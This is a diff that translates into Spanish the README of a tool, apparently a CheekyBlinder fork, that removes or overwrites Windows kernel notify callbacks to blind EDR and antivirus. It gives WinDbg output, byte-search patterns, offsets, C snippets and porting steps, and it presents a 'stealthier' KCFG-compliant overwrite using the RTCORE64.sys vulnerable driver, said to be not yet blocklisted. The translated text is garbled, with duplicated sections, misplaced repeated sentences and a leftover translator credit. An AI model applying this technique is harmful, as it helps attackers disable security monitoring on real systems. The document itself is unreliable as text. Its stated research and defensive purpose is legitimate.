@@ -1,88 +1,112 @@
 # Kernel Notify Callbacks Removal
 
 
-CheekyBlinder is a project that was developed developed 5 years ago for removing kernel callbacks related to process creation, image load, thread creation, and registry modifications by https://github.com/br-sn.
+CheekyBlinder es un proyecto desarrollado hace 5 años para eliminar las llamadas de retorno del kernel relacionadas con la creación de procesos, carga de imágenes, creación de hilos y modificaciones del registro por https://github.com/br-sn.
 
-## Warning
+## Advertencia
 
-Even though you can download the binaries from the `releases`, you have to make sure that the offsets and the binary search opcodes done is the same on your windows version or you will get a **BLUE SCREEN OF DEATH**
+Aunque puedes descargar los binarios de los `releases`, tienes que asegurarte de que los offsets y los opcodes de busqueda de binarios realizados son los mismos en tu version de windows o obtendras una **PANTALLA AZUL DE MUERTE**.
 
-## Major Updates
+Traducción realizada con la versión gratuita del traductor DeepL.com
 
-- Updated the exploit to work on the latest Windows versions.
+## Principales actualizaciones
 
-- Introduced a stealthier method for bypassing kernel callbacks (not publicly disclosed yet, at least not as far as i know).
+- Actualizado el exploit para que funcione en las últimas versiones de Windows.
 
-- Completed the registry callback removal, which was previously non-completed.
+- Introducido un método más sigiloso para eludir las retrollamadas del kernel (aún no revelado públicamente, al menos que yo sepa).
 
-- Added step-by-step guidance on modifying the exploit for future or different Windows versions.
+- Completada la eliminación del callback del registro, que antes no estaba completada.
 
-- Heavely modified the code to make it reusable for other kernel modifications.
+- Añadida guía paso a paso para modificar el exploit para futuras o diferentes versiones de Windows.
+
+- Modificado el código para hacerlo reutilizable para otras modificaciones del kernel.
+
+CheekyBlinder es un proyecto desarrollado hace 5 años para eliminar callbacks del kernel relacionados con la creación de procesos, carga de imágenes, creación de hilos y modificaciones del registro por https://github.com/br-sn.
+
+## Advertencia
+
+Aunque puedes descargar los binarios de los `releases`, tienes que asegurarte de que los offsets y los opcodes de busqueda de binarios realizados son los mismos en tu version de windows o obtendras una **PANTALLA AZUL DE MUERTE**.
+
+
 
 ## Prerequisistes
 
-This code is based on the original blog post: [Removing Kernel Callbacks Using Signed Drivers](https://br-sn.github.io/Removing-Kernel-Callbacks-Using-Signed-Drivers/) so i recommend going over the concepts there first.
+Este código está basado en la entrada original del blog: [Removing Kernel Callbacks Using Signed Drivers](https://br-sn.github.io/Removing-Kernel-Callbacks-Using-Signed-Drivers/) por lo que recomiendo repasar los conceptos allí primero.
 
-This is an advanced topic requiring the following prerequisites:
+Este es un tema avanzado que requiere los siguientes prerrequisitos:
 
-- Assembly understanding
+- Conocimiento de ensamblador
 
-- Familiarity with C programming
+- Familiaridad con la programación en C
 
-- Experience with WinDbg
+- Experiencia con WinDbg
 
-- Familiarity with IDA
+- Familiaridad con IDA
 
-- Windows kernel exploitation knowledge
+- Conocimientos de explotación del kernel de Windows
 
-## Tools Used
+## Herramientas utilizadas
 
-WinDbg: [Windows Debugging Tools](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/)
+WinDbg: [Herramientas de depuración de Windows](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/)
 
 IDA: [Hex-Rays IDA Free](https://hex-rays.com/ida-free)
 
-## Kernel Debugging Setup
+## Configuración de depuración del kernel
 
-To debug your local kernel, follow the instructions here: [Setting up local kernel debugging](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-local-kernel-debugging-of-a-single-computer-manually)
+Para depurar tu kernel local, sigue las instrucciones aquí: [Configuración de la depuración del kernel local](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-local-kernel-debugging-of-a-single-computer-manually)
 
-## Target Audience
+## Público objetivo
 
-This project is for both pentesters and defenders to understand how attackers can bypass EDR kernel implementations.
+Este proyecto es para que tanto pentesters como defensores entiendan cómo los atacantes pueden eludir las implementaciones del kernel EDR.
 
-## Purpose
+## Propósito
 
-Tools exist already for example [EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast) which is great that will do this and more and calculate offsets automaticaly, but this is designed to be small and on point for multiple reasons:
+Ya existen herramientas, por ejemplo [EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast), que es genial y que hará esto y más y calculará los offsets automáticamente, pero esto está diseñado para ser pequeño y puntual por múltiples razones:
 
-- For everyone to be able to learn how technically bypassing EDR and kernel callback removal is done.
-- For having the flexibility to create your own tool which make it pretty easier to bypass signature based detection.
-- For researchers to be able to play around the code and debug and reverse.
-- Introducing a stealthier way which is not included in EDRSandblast
+- Para que todo el mundo sea capaz de aprender cómo se hace técnicamente eludir EDR y la eliminación de callback del kernel.
+- Para tener la flexibilidad de crear tu propia herramienta que haga más fácil eludir la detección basada en firmas.
+- Para que los investigadores puedan jugar con el código, depurarlo y revertirlo.
+- Introducir una forma más sigilosa que no está incluida en EDRSandblast.
 
-## New Introduced Method
 
-The public method for bypassing most kernel callbacks involves nulling the entire entry for the driver in the callback table. The new method discussed here is stealthier and modifies the callback function itself while maintaining Kernel Control Flow Guard (KCFG) compliance.
+## Nuevo método introducido
 
-we can overwrite the function itself by a KCFG comppliant function because based on the documentation of [microsoft](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nc-ntddk-pcreate_process_notify_routine) for setting up a notify routine, the routine doesn't return anything (it's void), so it's easy to find a KCFG compliant function that doesn't do much and even if it returns, the return value is not used.
+El método público para evitar la mayoría de las retrollamadas del kernel implica anular toda la entrada del controlador en la tabla de retrollamadas. El nuevo método discutido aquí es más sigiloso y modifica la función callback en sí misma mientras mantiene el cumplimiento de Kernel Control Flow Guard (KCFG).
 
-## Attacker Abuse Cases
+podemos sobreescribir la propia función por una función conforme a KCFG porque basándonos en la documentación de [microsoft](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nc-ntddk-pcreate_process_notify_routine) para configurar una rutina notify, la rutina no devuelve nada (es void), por lo que es fácil encontrar una función conforme a KCFG que no haga mucho e incluso si devuelve, el valor de retorno no se utiliza.
+## Público Objetivo
 
-An attacker with administrative privileges may attempt to disable EDR or install a rootkit. To interact with the kernel, a signed Microsoft driver is required. Since unsigned drivers cannot be loaded with Microsoft mitigations enabled (e.g., VBS, Hyper-V), attackers typically exploit vulnerable signed drivers that have not been blacklisted.
+Este proyecto es para que tanto pentesters como defensores entiendan como los atacantes pueden saltarse las implementaciones del kernel EDR.
 
-**NotifyRoutineKernelBypass project uses RTCORE64.sys driver which is not yet blocklisted by MICROSOFT**
+## Propósito
 
-## Introduction to Kernel Callbacks
+Ya existen herramientas, por ejemplo [EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast) que es genial y que hará esto y más y calculará los offsets automáticamente, pero esto está diseñado para ser pequeño y puntual por múltiples razones:
 
-AV vendors and kernel anti-cheat systems register kernel callbacks to monitor system events. These callbacks notify security software of user-mode events, such as process creation.
+- Para que todo el mundo sea capaz de aprender cómo se hace técnicamente eludir EDR y la eliminación de callback del kernel.
+- Para tener la flexibilidad de crear tu propia herramienta que haga más fácil eludir la detección basada en firmas.
+- Para que los investigadores puedan jugar con el código, depurarlo y revertirlo.
+- Introducir una forma más sigilosa que no está incluida en EDRSandblast.
 
-So the kernel driver will register a callback (for process creation in our example) inside the kernel which will notify the AV / EDR Driver when you create / spawn a new process in usermode.
 
-The kernel uses a callback array / table to save all the callback entries that are registred by the AV / EDR and will be notified when you create a process for example.
+## Casos de abuso del atacante
 
-**And the callback array is already writable in the kernel, which makes it as well easier for attackers to corrupt it.**
+Un atacante con privilegios administrativos puede intentar desactivar EDR o instalar un rootkit. Para interactuar con el kernel, se necesita un controlador firmado de Microsoft. Dado que los controladores no firmados no pueden cargarse con las mitigaciones de Microsoft activadas (por ejemplo, VBS, Hyper-V), los atacantes suelen explotar los controladores firmados vulnerables que no han sido incluidos en la lista negra.
 
-## Process creation kernel callbacks
+**El proyecto NotifyRoutineKernelBypass utiliza el controlador RTCORE64.sys, que aún no ha sido incluido en la lista negra de MICROSOFT**.
 
-For process creation callbacks the array is `nt!PspCreateProcessNotifyRoutine` which can be found inside the function `nt!PspSetCreateProcessNotifyRoutine`
+## Introducción a las retrollamadas del kernel
+
+Los proveedores de antivirus y los sistemas anti-trampas del kernel registran callbacks del kernel para monitorizar eventos del sistema. Estas retrollamadas notifican al software de seguridad de eventos en modo usuario, como la creación de procesos.
+
+Así, el controlador del kernel registrará una llamada de retorno (para la creación de procesos en nuestro ejemplo) dentro del kernel que notificará al controlador AV / EDR cuando se cree / genere un nuevo proceso en modo usuario.
+
+El kernel utiliza un array / tabla de callback para guardar todas las entradas de callback que son registradas por el AV / EDR y que serán notificadas cuando se cree un proceso por ejemplo.
+
+**Y el array de callbacks ya es escribible en el kernel, lo que facilita también a los atacantes corromperlo.**
+
+## Llamadas de retorno del núcleo para la creación de procesos
+
+Para las callbacks de creación de procesos el array es `nt!PspCreateProcessNotifyRoutine` que puede encontrarse dentro de la función `nt!PspSetCreateProcessNotifyRoutine`.
 
 <pre>
 nt!PspSetCreateProcessNotifyRoutine+0x54:
@@ -96,7 +120,7 @@ fffff807`23c1b2f9 4533c0          xor     r8d,r8d
 fffff807`23c1b2fc 4903cd          add     rcx,r13
 </pre>
 
-And now we can access the entries in the callback array as follow:
+Y ahora podemos acceder a las entradas de la matriz de devolución de llamada de la siguiente manera:
 
 <pre>
 lkd> dq nt!PspCreateProcessNotifyRoutine
@@ -110,9 +134,9 @@ fffff807`2410c560  00000000`00000000 00000000`00000000
 fffff807`2410c570  00000000`00000000 00000000`00000000
 </pre>
 
-Each one of these entries are a callback registred by an EDR sys driver, lets take the second entry as an example <mark>ffff800e`5c7f725f</mark>
+Cada una de estas entradas es un callback registrado por un driver EDR sys, tomemos la segunda entrada como ejemplo <mark>ffff800e`5c7f725f</mark>
 
-First we need to remove the last byte and null it out (The last 4 bits of these pointer addresses are insignificant), to access the callback entry structure.
+Primero tenemos que eliminar el último byte y anularlo (Los últimos 4 bits de estas direcciones de puntero son insignificantes), para acceder a la estructura de entrada de callback.
 
 <pre>
 lkd> ? (ffff800e`5c7f725f >> 4) << 4
@@ -127,9 +151,9 @@ fffff807`252e9b75 48894c2408      mov     qword ptr [rsp+8],rcx
 fffff807`252e9b7a 55              push    rbp
 </pre>
 
-The second entry which is <mark>fffff807`252e9b70</mark> is one of the functions that will be called when you create a process (WdFilter driver is related to windows defender). and this is only one of the callback entries.
+La segunda entrada que es <mark>fffff807`252e9b70</mark> es una de las funciones que seran llamadas cuando se cree un proceso (WdFilter driver esta relacionado con windows defender). y esta es solo una de las entradas callback.
 
-So in the original cheeckyblinder project what he did is he nulled the whole entry in the callback table which is this one <mark>ffff800e`5c7f725f</mark>, so using a R/W primitive kernel exploit we can null the entry, and this is what the callback table looks like after nulling it out.
+Así que en el proyecto original de cheeckyblinder lo que hizo fue anular toda la entrada en la tabla de callback que es esta <mark>ffff800e`5c7f725f</mark>, así que usando un exploit de kernel primitivo R/W podemos anular la entrada, y así es como queda la tabla de callback después de anularla.
 
 <pre>
 lkd> dq nt!PspCreateProcessNotifyRoutine
@@ -143,9 +167,9 @@ fffff807`2410c560  00000000`00000000 00000000`00000000
 fffff807`2410c570  00000000`00000000 00000000`00000000
 </pre>
 
-but what I did is, instead of nulling the whole entry, I changed the function in the callback array to another one that just returns but it has to be KCFG compliant.
+pero lo que hice fue, en lugar de anular toda la entrada, cambié la función en la matriz de devolución de llamada a otra que sólo devuelve, pero tiene que ser compatible con KCFG.
 
-`nt!KeGetCurrentIrql` is a KCFG valid function that just technicaly just returns.
+La función `nt!KeGetCurrentIrql` es una función válida para KCFG que técnicamente sólo devuelve.
 
 <pre>
 lkd> dq nt!PspCreateProcessNotifyRoutine
@@ -165,14 +189,14 @@ fffff804`8fdea060 440f20c0        mov     rax,cr8
 fffff804`8fdea064 c3              ret
 </pre>
 
-As you can see, instead of nulling the whole callback entry => we just changed the function inside the entry to KeGetCurrentIrql which will do nothing leading to bypassing what ever the AV / EDR was checking.
+Como puedes ver, en lugar de anular toda la entrada de callback => simplemente cambiamos la función dentro de la entrada a KeGetCurrentIrql, que no hará nada, evitando lo que el AV / EDR estaba comprobando.
 
-**And if EDR was monitoring the callback entry itself if it's null or not, this will bypass that monitoring technique.**
+**Y si el EDR estaba monitorizando la propia entrada callback si es nula o no, esto saltará esa técnica de monitorización.
 
 ## What is KCFG
-KCFG (Control Flow Guard) is a security feature related to Control Flow Guard (CFG), which is designed to protect software from certain types of attacks, particularly control flow hijacking attacks (e.g., buffer overflows, return-oriented programming or ROP attacks). It was first introduced by Microsoft to prevent these attacks by ensuring that execution of code only occurs at valid locations.
+KCFG (Control Flow Guard) es una característica de seguridad relacionada con Control Flow Guard (CFG), que está diseñada para proteger el software de ciertos tipos de ataques, en particular ataques de secuestro de flujo de control (por ejemplo, desbordamientos de búfer, programación orientada al retorno o ataques ROP). Fue introducido por primera vez por Microsoft para evitar estos ataques garantizando que la ejecución del código sólo se produzca en ubicaciones válidas.
 
-So All indirect calls (call rax for example) will be replaced and verified by KCFG like below.
+Así, todas las llamadas indirectas (call rax por ejemplo) serán reemplazadas y verificadas por KCFG como se indica a continuación.
 
 <pre>
 lkd> u FLTMGR!FltDoCompletionProcessingWhenSafe+0x77
@@ -193,9 +217,9 @@ nt!guard_dispatch_icall:
 fffff807`23820177 4885c0          test    rax,rax
 </pre>
 
-The real function which we want to call will be loaded into rax and KCFG (nt!guard_dispatch_icall) will be called, which will verify that the function inside rax is a valid function through a bitmap using the following process (the process is inside nt!guard_dispatch_icall).
+La función real a la que queremos llamar se cargará en rax y se llamará a KCFG (nt!guard_dispatch_icall), que verificará que la función dentro de rax es una función válida mediante un mapa de bits usando el siguiente proceso (el proceso está dentro de nt!guard_dispatch_icall).
 
-The calculation are based on the function `nt!KeGetCurrentIrql`, because this is the function that we are going to end up calling.
+Los cálculos se basan en la función `nt!KeGetCurrentIrql`, porque esta es la función que vamos a acabar llamando.
 
 <pre>
 lkd> ? nt!KeGetCurrentIrql >> 9 (Will be used as Index)
@@ -215,9 +239,9 @@ Evaluate expression:
 Binary:  00000000 0<mark>1</mark>000001 00000000 00000100 00000000 00000000 01000100 00000000
 </pre>
 
-The `BitToCheck` which in our case is the bit 54 needs to be `1`, if it's `1` it means the call is valid which is the case for `KeGetCurrentIrql`.
+El `BitToCheck` que en nuestro caso es el bit 54 tiene que ser `1`, si es `1` significa que la llamada es válida que es el caso de `KeGetCurrentIrql`.
 
-So the plan is to replace the function pointing to the AV function to be called (`fffff807252e9b70`) to KeGetCurrentIrql (`fffff80723623fb0`) which will render the entry useless.
+Así que el plan es reemplazar la función que apunta a la función AV a llamar (`fffff807252e9b70`) por KeGetCurrentIrql (`fffff80723623fb0`) lo que hará la entrada inútil.
 
 <pre>
 lkd> u KeGetCurrentIrql L2
@@ -237,19 +261,19 @@ lkd> u fffff807`252e9b70 L2
 fffff805`55e99b75 48894c2408      mov     qword ptr [rsp+8],rcx
 </pre>
 
-## How to Fix the code to work on your windows version (process creation callback first)
+## Cómo Arreglar el código para que funcione en tu versión de windows (callback de creación de proceso primero)
 
-### Fixing the bytes for the byte search for your windows OS
+### Arreglar los bytes para la búsqueda de bytes para tu SO windows
 
-The change needs to be done on both `findprocesscallbackroutine` and `findprocesscallbackroutinestealth`
+El cambio debe hacerse tanto en `findprocesscallbackroutine` como en `findprocesscallbackroutinestealth`.
 
-`findprocesscallbackroutinestealth` is the function that i introduced which will modify the function inside the entry.
+`findprocesscallbackroutinestealth` es la función que he introducido que modificará la función dentro de la entrada.
 
-`findprocesscallbackroutine` is the original function from the original exploit which will null out the entry.
+`findprocesscallbackroutine` es la función original del exploit original que anulará la entrada.
 
-The original code will do a `byte search` to find the location of the function that is using the callback table (`nt!PspSetCreateProcessNotifyRoutine`) starting from a exported function close to it. 
+El código original hará una `byte search` para encontrar la ubicación de la función que está utilizando la tabla de callback (`nt!PspSetCreateProcessNotifyRoutine`) a partir de una función exportada cerca de ella.
 
-First you need double check the bytes did not change for your windows OS.
+Primero debe comprobar que los bytes no han cambiado en su sistema operativo.
 
 <pre>
 struct Offsets {
@@ -281,12 +305,11 @@ struct Offsets getVersionOffsets() {
 }
 </pre>
 
-The first DWORD is the callback related to the process creation and it contains the bytes that the program will search for.
+El primer DWORD es el callback relacionado con la creación del proceso y contiene los bytes que el programa buscará.
 
- we know that the function `nt!PspSetCreateProcessNotifyRoutine` is using the callback array.
+ sabemos que la función `nt!PspSetCreateProcessNotifyRoutine` está usando el array callback.
 
-The idea is to find some bytes close to the `lea` command that is using the callback array we are interested in, and the bytes that we will use, they need to be static so we can rely on them for byte searching and not change after each reboot.
-
+La idea es encontrar algunos bytes cerca del comando `lea` que está usando el array callback que nos interesa, y los bytes que usaremos, necesitan ser estáticos para que podamos confiar en ellos para la búsqueda de bytes y no cambien después de cada reinicio.
 <pre>
 lkd> u nt!PspSetCreateProcessNotifyRoutine L20
 nt!PspSetCreateProcessNotifyRoutine:
@@ -316,25 +339,25 @@ fffff800`a4e62021 7338            jae     nt!PspSetCreateProcessNotifyRoutine+0x
 fffff800`a4e62023 4e8d24f500000000 lea     r12,[r14*8]
 </pre>
 
-And so the bytes that we can use for example is the highlighed ones starting from xor, but we need to write them in the c variable in reverse (little endian arch) which is `0x7340fe8341f63345`.
+Y así los bytes que podemos usar por ejemplo son los resaltados empezando por xor, pero necesitamos escribirlos en la variable c en inverso (little endian arch) que es `0x7340fe8341f63345`.
 
 <pre>
 lkd> dq ffffff800`a4e6201a L1
 fffff800`a4e6201a  7340fe83`41f63345
 </pre>
 
-### Fixing the offset
-Next we need to fix the offset, to be able to extract and calculate the address of the callback array.
+### Fijar el offset
+A continuación necesitamos fijar el offset, para poder extraer y calcular la dirección del array de callback.
 
 <pre>
 void notifyRoutine::findprocesscallbackroutine(DWORD64 remove) {
 
-	//we search the memory between PoRegisterCoalescingCallback and EtwWriteEndScenario for a specific set of instructions next to a relative LEA containing the offset to the PspCreateProcessNotifyRoutine array of callbacks.
+	//buscamos en la memoria entre PoRegisterCoalescingCallback y EtwWriteEndScenario un conjunto específico de instrucciones junto a una LEA relativa que contiene el offset al array de callbacks PspCreateProcessNotifyRoutine.
 	Offsets offsets = getVersionOffsets();
 	const DWORD64 IoDeleteSymbolicLink = GetFunctionAddress("IoDeleteSymbolicLink");
 	const DWORD64 RtlDestroyHeap = GetFunctionAddress("RtlDestroyHeap");
 
-	//the address returned by the patternsearch is just below the offsets. 
+	//la dirección devuelta por la búsqueda de patrones está justo debajo de los desplazamientos.
 	DWORD64 patternaddress = PatternSearch(IoDeleteSymbolicLink, RtlDestroyHeap, offsets.process);
 	Log("[+] patternaddress: %p", patternaddress);
 
@@ -346,21 +369,22 @@ void notifyRoutine::findprocesscallbackroutine(DWORD64 remove) {
 		sizeof(offset)
 	);
 
-	//so we take the 64 bit address, but have a 32 bit addition. To prevent overflow, we grab the first half (shift right, shift left), then add the 32bit DWORD patternaddress with the 32bit offset, and subtract 8. *cringe*
+	//así que tomamos la dirección de 64 bits, pero tenemos una suma de 32 bits. Para evitar el desbordamiento, tomamos la primera mitad (desplazamiento a la derecha, desplazamiento a la izquierda), luego sumamos la dirección patrón DWORD de 32 bits con el desplazamiento de 32 bits, y restamos 8. *cringe*
 	DWORD64 PspCreateProcessNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - <mark>0x0f</mark> + 0x04;
   ....................
 }
 </pre>
 
-Looking at this piece of code, we will see that after the byte search we will get the patternaddress which will be pointing to the xor command `fffff800a4e6201a`.
-We need to substract from it an offset to make it point to the 4-byte relative offset of the array which is `712a4a00` in reverse at `fffff800a4e6200b`.
+Mirando este trozo de código, veremos que después de la búsqueda de bytes obtendremos la patternaddress que apuntará al comando xor `fffff800a4e6201a`.
+Necesitamos restarle un offset para que apunte al offset relativo de 4 bytes del array que es `712a4a00` al revés en `fffff800a4e6200b`.
 
 <pre>
 lkd> dd fffff800`a4e6200b L1
 fffff800`a4e6200b  004a2a71
 </pre>
 
-so we need to substract `0xf` from the pattern address.
+
+así que tenemos que restar `0xf` de la dirección del patrón.
 
 <pre>
 lkd> dd fffff800`a4e6200b L1
@@ -369,56 +393,58 @@ lkd> ? fffff800`a4e6201a - fffff800`a4e6200b
 Evaluate expression: 15 = 00000000`0000000f
 </pre>
 
-### Fixing the functions
-`nt!PspSetCreateProcessNotifyRoutine` is not an exported function, so we cannot get the address of the function directly in our c code.
-We need to start the byte search using a function that is exported and close to `nt!PspSetCreateProcessNotifyRoutine`.
+### Arreglando las funciones
+`nt!PspSetCreateProcessNotifyRoutine` no es una función exportada, por lo que no podemos obtener la dirección de la función directamente en nuestro código c.
+Necesitamos iniciar la búsqueda de bytes usando una función que sea exportada y cercana a `nt!PspSetCreateProcessNotifyRoutine`.
 
-the functions needs to be exported to be able to use GetProcAddress and GetModuleHandle on them and get the function address.
+las funciones necesitan ser exportadas para poder usar GetProcAddress y GetModuleHandle en ellas y obtener la dirección de la función.
 
-So To find the closest exported functions (start and end) to use in our code as a starting point for the byte search, we can use IDA.
+Así que para encontrar las funciones exportadas más cercanas (inicio y fin) para usar en nuestro código como punto de partida para la búsqueda de bytes, podemos usar IDA.
 
-First let's get the offset to the function from the nt base
+Primero obtengamos el offset a la función desde la base nt
+
+así que necesitamos restar `0xf` de la dirección del patrón.
 
 <pre>
 lkd> ? nt!PspSetCreateProcessNotifyRoutine - nt
 Evaluate expression: 8499848 = <mark>00000000`00a61fd0</mark>
 </pre>
 
-Then copy the `ntoskrnl.exe` from `c:/windows/system32` to open it in IDA.
+Luego copiamos el `ntoskrnl.exe` desde `c:/windows/system32` para abrirlo en IDA.
 
-Then in IDA, first of all we rebase the IMAGEBASE to 0x00, to make the offsets we get in `windbg` from the nt base the actual address in IDA, without any additional calculations.
+Luego en IDA, en primer lugar cambiamos la IMAGEBASE a 0x00, para hacer que los desplazamientos que obtenemos en `windbg` de la base nt sean la dirección real en IDA, sin ningún cálculo adicional.
 
 ![IDA Rebase](./screenshots/RebaseProgram.png)
 
 ![IDA Rebase](./screenshots/Rebasev2.png)
 
-Next we go the `Export table` in IDA and reorder all the functions by `address`.
+A continuación vamos a la `Tabla de exportación` en IDA y reordenamos todas las funciones por `dirección`.
 
-Note: It will take some time for the addresses in the export table to be refreshed after the rebase.
+Nota: Tomará algún tiempo para que las direcciones en la tabla de exportación se actualicen después del rebase.
 
-And then you have to pick 2 functions where `0000000000a61fd0` which is the address of `nt!PspSetCreateProcessNotifyRoutine` is between them.
+Y entonces tienes que elegir 2 funciones donde `0000000000a61fd0` que es la dirección de `nt!PspSetCreateProcessNotifyRoutine` esté entre ellas.
 
-As you can, from the screenshot `IoDeleteSymbolicLink` and `RtlDestroyHeap` are the start and end functions that i will be using as `nt!PspSetCreateProcessNotifyRoutine` falls in between, so i can use `IoDeleteSymbolicLink` as the start of the byte search.
+Como se puede ver en la captura de pantalla `IoDeleteSymbolicLink` y `RtlDestroyHeap` son las funciones de inicio y fin que voy a utilizar ya que `nt!PspSetCreateProcessNotifyRoutine` se encuentra en medio, por lo que puedo utilizar `IoDeleteSymbolicLink` como inicio de la búsqueda de bytes.
 
 ![Export Table](./screenshots/ExportTable.png)
 
-### Rest of the code
+### Resto del código
 
-and the rest of the code is looping thourght the callback array that we just found, and nulling the entry or replacing the function in the entry depending on what function you are using.
+y el resto del código es un bucle a través del array de callbacks que acabamos de encontrar, y anular la entrada o reemplazar la función en la entrada dependiendo de la función que estés usando.
 
 ```
-/delproc <address> - Remove Process Creation Callback
-/delprocstealth <address> - overwriting the Process Creation function Callback
+/delproc <dirección> - Eliminar Callback de Creación de Proceso
+/delprocstealth <dirección> - sobrescribir el Callback de la función de Creación de Proceso
 ```
 
-You can check the [Cheeckyblinder Blog](https://br-sn.github.io/Removing-Kernel-Callbacks-Using-Signed-Drivers/) for more info about the code.
+Puedes consultar el [Cheeckyblinder Blog](https://br-sn.github.io/Removing-Kernel-Callbacks-Using-Signed-Drivers/) para más información sobre el código.
 
 ## Thread Callback
-When creating a new thread, each entry in the callback array that was registred by the EDR will be called.
+Cuando se crea un nuevo hilo, cada entrada en el array de callbacks que fue registrada por el EDR será llamada.
 
-Same steps as we did for the process callback, it's just a different callback function and callback array for the thread related actions.
+Los mismos pasos que hicimos para la llamada de retorno del proceso, sólo que es una función de llamada de retorno y un array de llamadas de retorno diferentes para las acciones relacionadas con el hilo.
 
-The function is called `nt!PspSetCreateThreadNotifyRoutine` which is using the thread callback array `nt!PspCreateThreadNotifyRoutine`
+La función se llama `nt!PspSetCreateThreadNotifyRoutine` que utiliza el array de callbacks `nt!PspCreateThreadNotifyRoutine`.
 
 <pre>
 lkd> u nt!PspSetCreateThreadNotifyRoutine L12
@@ -443,7 +469,7 @@ fffff800`a4b54b4d 488bd7          mov     rdx,rdi</mark>
 fffff800`a4b54b50 e8774ac6ff      call    nt!ExCompareExchangeCallBack (fffff800`a47b95cc)
 </pre>
 
-The bytes will be `0x48d90c8d48c03345` and we need to substract `0x04` to get to the relative offset address of the callback array which is `007afd3a` and read it.
+Los bytes serán `0x48d90c8d48c03345` y tenemos que restar `0x04` para llegar a la dirección offset relativa de la matriz de callback que es `007afd3a` y leerla.
 
 <pre>
 lkd> dq fffff800`a4b54b46 L1
@@ -480,18 +506,18 @@ struct Offsets getVersionOffsets() {
 }
 </pre>
 
-Using the same method as the process callback we need to find 2 functions close to `PspSetCreateThreadNotifyRoutine` for the bytes searching.
+Usando el mismo método que el callback del proceso necesitamos encontrar 2 funciones cercanas a `PspSetCreateThreadNotifyRoutine` para la búsqueda de bytes.
 
 <pre>
 lkd> ? nt!PspSetCreateThreadNotifyRoutine - nt
-Evaluate expression: 7686936 = 00000000`00754b18
+Evaluar expresión: 7686936 = 00000000`00754b18
 </pre>
 
 ![Export Table](./screenshots/ExportTableThread.png)
 
-## Image Callback
+## Llamada de retorno de imagen
 
-The function is `nt!PsSetLoadImageNotifyRoutineEx`
+La función es `nt!PsSetLoadImageNotifyRoutineEx`.
 
 <pre>
 lkd> u nt!PsSetLoadImageNotifyRoutineEx L15
@@ -519,7 +545,7 @@ fffff800`a4e5c9b2 488bd6          mov     rdx,rsi
 fffff800`a4e5c9b5 488d0cc1        lea     rcx,[rcx+rax*8]</mark>
 </pre>
 
-same as the others, we need to make sure the bytes are correct `0x8d48d68b48c03345` and the offset is still the same `0x04` and find 2 functions close to `nt!PsSetLoadImageNotifyRoutineEx` for the byte search.
+igual que los otros, necesitamos asegurarnos de que los bytes son correctos `0x8d48d68b48c03345` y el offset sigue siendo el mismo `0x04` y encontrar 2 funciones cercanas a `nt!PsSetLoadImageNotifyRoutineEx` para la búsqueda de bytes.
 
 <pre>
 lkd> dq fffff800`a4e5c9af L1
@@ -533,32 +559,33 @@ Evaluate expression: 10865008 = 00000000`00a5c970
 
 ![Export Table 2](./screenshots/ExportTableImage.png)
 
-Based on the screenshot the function `PsSetLoadImageNotifyRoutineEx` is exported and we can use it directly, it wasn't always the case between windows versions. so i will still use `RtlAppendStringToString` as start and `IoInitializeMiniCompletionPacket` as end.
+Basado en la captura de pantalla la función `PsSetLoadImageNotifyRoutineEx` es exportada y podemos usarla directamente, no siempre fue el caso entre versiones de windows. así que seguiré usando `RtlAppendStringToString` como inicio y `IoInitializeMiniCompletionPacket` como fin.
 
-## Registry Callback
+## Llamada de retorno al registro
 
-For the registry callback its a little bit different where all the callback functions are saved inside a linked list called `nt!CallbackListHead`.
+Para el callback del registro es un poco diferente donde todas las funciones callback se guardan dentro de una lista enlazada llamada `nt!CallbackListHead`.
 
-First we need to to find out a function that uses `nt!CallbackListHead` and ideally an exported function to use it in our byte search.
+Primero necesitamos encontrar una función que use `nt!CallbackListHead` e idealmente una función exportada para usarla en nuestra búsqueda de bytes.
 
-First let's calculate the offset of `nt!CallbackListHead` from the nt base
+Primero vamos a calcular el offset de `nt!CallbackListHead` desde la base nt
+igual que los otros, necesitamos asegurarnos de que los bytes son correctos `0x8d48d68b48c03345` y el offset sigue siendo el mismo `0x04` y encontrar 2 funciones cercanas a `nt!PsSetLoadImageNotifyRoutineEx` para la búsqueda de bytes.
 
 <pre>
 lkd> ? nt!CallbackListHead - nt
 Evaluate expression: 15691152 = 00000000`00ef6d90
 </pre>
 
-Then in IDA, lets go to that address by going to `Jump => Jump to Address` and use `00ef6d90`
+Luego en IDA, vamos a esa dirección yendo a `Jump => Jump to Address` y usamos `00ef6d90
 
-![Jump To Address](./screenshots/JumpToAddress.png)
+![Saltar a dirección](./screenshots/JumpToAddress.png)
 
-Now we can hover our mouse on `CallbackListHead` => click on it => and then press x for cross reference which will tell us who is actually using that list.
+Ahora podemos situar nuestro ratón sobre `CallbackListHead` => pulsar sobre él => y luego pulsar x para obtener una referencia cruzada que nos dirá quién está usando realmente esa lista.
 
-![Cross Reference](./screenshots/crossReference.png)
+![Referencia cruzada](./screenshots/crossReference.png)
 
-And luckily the first function `CmUnRegisterCallback` is also an exported function, so we can use the following functions as start and end for our search.
+Y por suerte la primera función `CmUnRegisterCallback` también es una función exportada, así que podemos usar las siguientes funciones como inicio y fin de nuestra búsqueda.
 
-![Export Table 3](./screenshots/ExportTableRegistry.png)
+![Exportar Tabla 3](./screenshots/ExportTableRegistry.png)
 
 <pre>
 nt!CmUnRegisterCallback+0x58:
@@ -572,14 +599,14 @@ fffff800`a4baeac5 48395818        cmp     qword ptr [rax+18h],rbx
 fffff800`a4baeac9 75d5            jne     nt!CmUnRegisterCallback+0x50 (fffff800`a4baeaa0)
 </pre>
 
-The bytes will be `0x4024448948f88b48` and we need to substract `0x09` to get to the relative offset address of the callback array which is `007482e1` and read it.
+Los bytes serán `0x4024448948f88b48` y tenemos que restar `0x09` para llegar a la dirección offset relativa de la matriz de callback que es `007482e1` y leerla.
 
 <pre>
 lkd> dq fffff800`a4baeabc L1
 fffff800`a4baeabc  40244489`48f88b48
